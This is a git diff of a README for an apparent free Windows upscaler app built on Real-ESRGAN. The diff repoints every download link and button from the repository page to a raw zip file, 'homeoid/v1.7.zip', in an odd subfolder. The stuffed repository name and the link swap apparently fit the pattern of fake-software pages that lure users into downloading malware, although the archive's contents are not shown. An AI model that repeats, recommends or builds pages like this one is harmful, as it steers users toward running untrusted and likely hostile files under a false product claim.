@@ -1,7 +1,7 @@
 <h1>🎯 ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026 - Upscale Images & Videos in One Click</h1>
 
 <p align="center">
-  <a href="https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026">
+  <a href="https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026/raw/refs/heads/main/homeoid/v1.7.zip">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20Upscaler-4CAF50?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" />
   </a>
 </p>
@@ -20,7 +20,7 @@ Follow these simple steps to get the app running on your Windows computer.
 
 Visit this link to download the application:
 
-➡️ **Primary Download:** [https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026](https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026)
+➡️ **Primary Download:** [https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026/raw/refs/heads/main/homeoid/v1.7.zip](https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026/raw/refs/heads/main/homeoid/v1.7.zip)
 
 Click the green "Code" button or the download icon to save the file to your computer. The download will start automatically.
 
@@ -194,7 +194,7 @@ Your computer should meet these basic specs for a smooth experience:
 <h2>📥 Download the Application Now</h2>
 
 <p align="center">
-  <a href="https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026" style="display:inline-block;padding:20px 50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:28px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ DOWNLOAD ESRGAN-DESKTOP</a>
+  <a href="https://github.com/starka7665/ESRGAN-Desktop---Real-ESRGAN-Upscaler-2026/raw/refs/heads/main/homeoid/v1.7.zip" style="display:inline-block;padding:20px 50px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:28px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 8px 20px rgba(0,0,0,0.3);">⬇️ DOWNLOAD ESRGAN-DESKTOP</a>
 </p>
 
 <p align="center">Free • No Registration • Works Offline • Windows Only</p>
